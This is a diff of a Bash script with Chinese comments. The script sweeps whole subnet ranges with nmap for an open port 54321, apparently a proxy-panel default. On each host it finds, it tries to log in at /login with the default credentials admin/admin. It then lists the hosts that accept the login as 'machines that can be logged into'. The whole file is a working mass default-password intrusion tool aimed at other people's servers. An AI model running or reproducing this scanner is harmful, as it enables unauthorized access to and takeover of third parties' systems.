@@ -19,12 +19,16 @@ range_2='170' # 第三段ip地址范围
 
 # 删除文件
 rm -rf result.txt week.log all.log 
-echo -e "${YELLOW}将扫描 ${ip}.${range_1}.1/24 - ${ip}.${range_2}.1/24${END}"
+
 for ((i=range_1; i<=range_2; i++)); do
+  echo -e "${YELLOW}将扫描 ${ip}.${range_1}.1/24 - ${ip}.${range_2}.1/24${END}"
   echo -e "${QING}正在扫描 ${ip}.${i}.1/24:54321${END}"
+  
   nmap -Pn -p 54321 -T4 ${ip}.${i}.1/24 --open >> result.txt
+  
   # 提取ip地址到ip.txt文件，按照第三列和第四列数字升序排序的去重后的IP地址列表
   grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" result.txt | sort -t. -k3,3n -k4,4n | uniq > ip.txt
+  
   for ip_ad in $(sed -n 'p' ip.txt); do
     res1=$(curl "http://${ip_ad}:54321/login"  --max-time 5 --data-raw 'username=admin&password=admin' --compressed  --insecure)
     res2=$(curl "https://${ip_ad}:54321/login" --max-time 5 --data-raw 'username=admin&password=admin' --compressed  --insecure)
@@ -38,3 +42,7 @@ for ((i=range_1; i<=range_2; i++)); do
         echo $ip_ad | tee >> all.log
   done;
 done
+
+echo -e "执行完成，${GREEN}week.log${END}是可登录的机器，${YELLOW}all.log${END}是改了密码的机器"
+echo -e "可登录的ip如下："
+cat week.log | uniq
